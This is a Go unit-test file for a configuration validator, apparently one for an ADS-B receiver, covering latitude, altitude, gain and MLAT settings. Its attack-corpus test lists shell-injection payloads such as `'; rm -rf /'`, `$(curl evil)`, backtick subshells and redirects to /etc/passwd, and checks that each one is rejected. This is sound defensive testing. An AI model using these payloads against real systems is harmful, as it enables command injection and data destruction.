package configspec

import (
	"strings"
	"testing"
)

func TestValidate_HappyPaths(t *testing.T) {
	t.Parallel()
	cases := []struct{ key, value string }{
		{"LATITUDE", "0"},
		{"LATITUDE", "51.5"},
		{"LATITUDE", "-89.99"},
		{"LATITUDE", "90"},
		{"LONGITUDE", "0"},
		{"LONGITUDE", "180"},
		{"LONGITUDE", "-180"},
		{"ALTITUDE", "0"},
		{"ALTITUDE", "120m"},
		{"ALTITUDE", "400ft"},
		{"ALTITUDE", "-3.5"},
		{"MLAT_USER", "alice"},
		{"MLAT_USER", "Alice_42"},
		{"MLAT_USER", "a-b_C"},
		{"MLAT_USER", strings.Repeat("a", 64)},
		{"MLAT_USER", ""},
		{"MLAT_ENABLED", "true"},
		{"MLAT_ENABLED", "false"},
		{"GAIN", "auto"},
		{"GAIN", "min"},
		{"GAIN", "max"},
		{"GAIN", "0"},
		{"GAIN", "49.6"},
		{"GAIN", "60"},
		{"UAT_INPUT", ""},
		{"UAT_INPUT", "127.0.0.1:30978"},
	}
	for _, c := range cases {
		t.Run(c.key+"/"+c.value, func(t *testing.T) {
			if err := Validate(c.key, c.value); err != nil {
				t.Errorf("Validate(%q,%q) = %v, want nil", c.key, c.value, err)
			}
		})
	}
}

func TestValidate_RejectsOutOfRange(t *testing.T) {
	t.Parallel()
	cases := []struct{ key, value string }{
		{"LATITUDE", "91"},
		{"LATITUDE", "-91"},
		{"LATITUDE", "200"},
		{"LONGITUDE", "181"},
		{"LONGITUDE", "-181"},
		{"ALTITUDE", "20000"},
		{"ALTITUDE", "-2000"},
		{"GAIN", "61"},
		{"GAIN", "-1"},
	}
	for _, c := range cases {
		t.Run(c.key+"/"+c.value, func(t *testing.T) {
			if err := Validate(c.key, c.value); err == nil {
				t.Errorf("Validate(%q,%q) returned nil, want error", c.key, c.value)
			}
		})
	}
}

func TestValidate_RejectsNonNumericFloats(t *testing.T) {
	t.Parallel()
	for _, v := range []string{"NaN", "+Inf", "-Inf", "1e9999", "abc", ""} {
		t.Run("LATITUDE/"+v, func(t *testing.T) {
			if err := Validate("LATITUDE", v); err == nil {
				t.Errorf("LATITUDE accepted %q", v)
			}
		})
	}
}

func TestValidate_RejectsBadShapes(t *testing.T) {
	t.Parallel()
	cases := []struct{ key, value, why string }{
		{"ALTITUDE", "120cm", "bad-suffix"},
		{"ALTITUDE", "120 m", "embedded-space"},
		{"ALTITUDE", "abc", "non-numeric"},
		{"MLAT_USER", "with space", "space"},
		{"MLAT_USER", "name@home", "at-sign"},
		{"MLAT_USER", strings.Repeat("a", 65), "too-long"},
		{"MLAT_ENABLED", "", "empty"},
		{"MLAT_ENABLED", "yes", "yesno-not-bool"},
		{"MLAT_ENABLED", "1", "numeric-not-bool"},
		{"MLAT_ENABLED", "True", "wrong-case"},
		{"GAIN", "Auto", "wrong-case"},
		{"GAIN", "off", "unknown-string"},
		{"UAT_INPUT", "127.0.0.1:30979", "wrong-port"},
		{"UAT_INPUT", "10.0.0.5:30978", "remote-host"},
		{"UAT_INPUT", "any-other-string", "free-form"},
	}
	for _, c := range cases {
		t.Run(c.key+"/"+c.why, func(t *testing.T) {
			if err := Validate(c.key, c.value); err == nil {
				t.Errorf("Validate(%q,%q) accepted bad shape", c.key, c.value)
			}
		})
	}
}

func TestValidate_RejectsNonWhitelistedKey(t *testing.T) {
	t.Parallel()
	for _, k := range []string{"NET_OPTIONS", "JSON_OPTIONS", "MYSTERY", "INPUT"} {
		if err := Validate(k, "x"); err == nil {
			t.Errorf("Validate(%q,...) accepted non-write key", k)
		}
	}
}

// TestValidate_AttackCorpus is the table-driven attack-string sweep across
// every writable key × every metachar. Each row gets a named subtest so a
// regression points at the exact (key, attack) pair.
func TestValidate_AttackCorpus(t *testing.T) {
	t.Parallel()
	attacks := []struct {
		name, payload string
	}{
		{"semicolon-rm", `'; rm -rf /'`},
		{"backtick-id", "`id`"},
		{"dollar-subshell", `$(curl evil)`},
		{"newline-injection", "value\necho pwn"},
		{"cr-injection", "value\rfoo"},
		{"backslash", `a\b`},
		{"dquote", `with"quote`},
		{"squote", `with'quote`},
		{"pipe-cmd", "value | id"},
		{"and-cmd", "value && id"},
		{"or-cmd", "value || id"},
		{"redirect-out", "value > /etc/passwd"},
		{"redirect-in", "value < /etc/passwd"},
		{"comment", "value # inline"},
		{"null-byte", "val\x00ue"},
	}
	for _, key := range WriteKeys {
		for _, atk := range attacks {
			t.Run(key+"/"+atk.name, func(t *testing.T) {
				if err := Validate(key, atk.payload); err == nil {
					t.Errorf("Validate(%q,%q) accepted attack payload", key, atk.payload)
				}
			})
		}
	}
}

func TestCanonicalize_Altitude(t *testing.T) {
	t.Parallel()
	cases := map[string]string{
		"120":     "120m",
		"120m":    "120m",
		"-3.5":    "-3.5m",
		"400ft":   "400ft",
		"0":       "0m",
	}
	for in, want := range cases {
		if got := Canonicalize("ALTITUDE", in); got != want {
			t.Errorf("Canonicalize(ALTITUDE, %q) = %q, want %q", in, got, want)
		}
	}
}

func TestCheckUniversal_ScansAnyValue(t *testing.T) {
	t.Parallel()
	for _, v := range []string{"good-value", "127.0.0.1:30978", "auto", ""} {
		if err := CheckUniversal("X", v); err != nil {
			t.Errorf("CheckUniversal(%q) errored: %v", v, err)
		}
	}
	for _, v := range []string{`"x`, `a;b`, "x\nyy", "x\x00y"} {
		if err := CheckUniversal("X", v); err == nil {
			t.Errorf("CheckUniversal(%q) accepted unsafe value", v)
		}
	}
}

func TestIsValidationError(t *testing.T) {
	t.Parallel()
	if !IsValidationError(Validate("LATITUDE", "200")) {
		t.Error("IsValidationError(range error) = false")
	}
}
